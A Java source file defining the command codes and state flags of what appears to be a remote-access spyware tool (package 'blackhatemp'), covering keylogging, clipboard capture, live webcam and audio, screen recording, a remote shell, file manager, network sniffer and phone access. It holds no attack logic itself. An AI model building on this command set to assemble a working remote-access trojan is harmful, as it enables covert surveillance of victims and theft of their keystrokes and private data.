/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package blackhatemp;

/**
 *
 * @author abaza
 */
public class Command {

    public static final int FIAL = 900;
    public static final int DONE = 800;
    public static final int CLOSE_SESSION = 700;
    public static final int CLOSE_SERVE_CONNECTION = 100;
    public static final int TASKS = 1000;
    public static final int VIDEO_PATH = 2000;
    public static final int UPDATE_APPLICATION = 3000;
    public static final int UPDATE_PRAMETER = 4000;
    public static final int RESTORY_TASKS = 5000;
    public static final int RETERN_KEYBORD = 6000;

    public static final int INFORMATION = 1;

    public static final int OPERON = 2;
    public static final int SHUTDOWN = -2;
    public static final int RESTART = 3;

    public static final int SCREEN_RECORD = 4;
    public static final int STOP_SCREEN_RECORD = -4;

    public static final int SCREEN_SHUT = 5;
    public static final int STOP_SCREEN_SHUT = -5;

    public static final int SCREEN_MONITOR = 6;
    public static final int STOP_SCREEN_MONITOR = -6;

    public static final int SCREEN_WEBCAM = 7;
    public static final int STOP_SCREEN_WEBCAM = -7;
    
    public static final int SCREEN_WEBCAM_LIFE = 24;
    public static final int STOP_SCREEN_WEBCAM_LIFE = -24;

    public static final int AUDIO_LIFE = 8;
    public static final int STOP_AUDIO_LIFE = -8;

    public static final int AUDIO_RECORD = 9;
    public static final int STOP_AUDIO_RECORD = -9;

    public static final int KEYBORD = 10;
    public static final int STOP_KEYBORD = -10;

    public static final int CLIPBORD = 11;
    public static final int STOP_CLIPBORD = -11;

    public static final int APPLICATION = 12;
    public static final int STOP_APPLICATION = -12;

    public static final int SHELL = 13;
    public static final int STOP_SHELL = -13;

    public static final int FILEMANGER = 14;
    public static final int STOP_FILEMANGER = -14;

    public static final int USB = 15;
    public static final int STOP_USB = -15;

    public static final int IP_SCAN = 16;

    public static final int SNIFFER = 17;
    public static final int STOP_SNIFFER = -17;

    public static final int FOOTPRINT = 18;
    public static final int STOP_FOOTPRINT = -18;

    public static final int INOFFICEORNOT = 19;
    public static final int STOP_INOFFICEORNOT = -19;

    public static final int PHONE = 20;
    public static final int STOP_PHONE = -20;

    public static final int DOWNLOAD = 21;
    public static final int STOP_DOWNLOAD = -21;

    public static final int ZIP_FLAG_SCREEN_SHUT = 22;
    public static final int STOP_ZIP_FLAG_SCREEN_SHUT = -22;

    public static final int RESEVED_FLAG_SCREEN_SHUT = 23;
    public static final int STOP_RESEVED_FLAG_SCREEN_SHUT = -23;
    /////////////////////////////////////////////////////////////

    public static boolean KEY_OPERON = false;
    public static boolean KEY_SHUTDOWN = false;
    public static boolean KEY_RESTART = false;
    public static boolean KEY_WACKUP = false;
    public static boolean KEY_SCREEN_RECORD = false;
    public static boolean KEY_STOP_SCREEN_RECORD = false;
    public static boolean KEY_SCREEN_SHUT = false;
    public static boolean KEY_ZIP_FLAG_SCREEN_SHUT = false;
    public static boolean KEY_STOP_ZIP_FLAG_SCREEN_SHUT = false;
    public static boolean KEY_RESEVED_FLAG_SCREEN_SHUT = false;
    public static boolean KEY_STOP_RESEVED_FLAG_SCREEN_SHUT = false;
    public static boolean KEY_STOP_SCREEN_SHUT = false;
    public static boolean KEY_SCREEN_MONITOR = false;
    public static boolean KEY_STOP_SCREEN_MONITOR = false;
    public static boolean KEY_SCREEN_WEBCAM = false;
    public static boolean KEY_SCREEN_WEBCAM_LIFE = false;
    public static boolean KEY_STOP_SCREEN_WEBCAM_LIFE = false;
    public static boolean KEY_STOP_SCREEN_WEBCAM = false;
    public static boolean KEY_AUDIO_LIFE = false;
    public static boolean KEY_STOP_AUDIO_LIFE = false;
    public static boolean KEY_AUDIO_RECORD = false;
    public static boolean KEY_STOP_AUDIO_RECORD = false;
    public static boolean KEY_KEYBORD = false;
    public static boolean KEY_STOP_KEYBORD = false;
    public static boolean KEY_CLIPBORD = false;
    public static boolean KEY_STOP_CLIPBORD = false;
    public static boolean KEY_APPLICATION = false;
    public static boolean KEY_STOP_APPLICATION = false;
    public static boolean KEY_SHELL = false;
    public static boolean KEY_STOP_SHELL = false;
    public static boolean KEY_FILEMANGER = false;
    public static boolean KEY_STOP_FILEMANGER = false;
    public static boolean KEY_USB = false;
    public static boolean KEY_STOP_USB = false;
    public static boolean KEY_IP_SCAN = false;
    public static boolean KEY_SNIFFER = false;
    public static boolean KEY_STOP_SNIFFER = false;
    public static boolean KEY_FOOTPRINT = false;
    public static boolean KEY_STOP_FOOTPRINT = false;
    public static boolean KEY_INOFFICEORNOT = false;
    public static boolean KEY_STOP_INOFFICEORNOT = false;
    public static boolean KEY_PHONE = false;
    public static boolean KEY_STOP_PHONE = false;
    public static boolean KEY_DOWNLOAD = false;
    public static boolean KEY_STOP_DOWNLOAD = false;
}
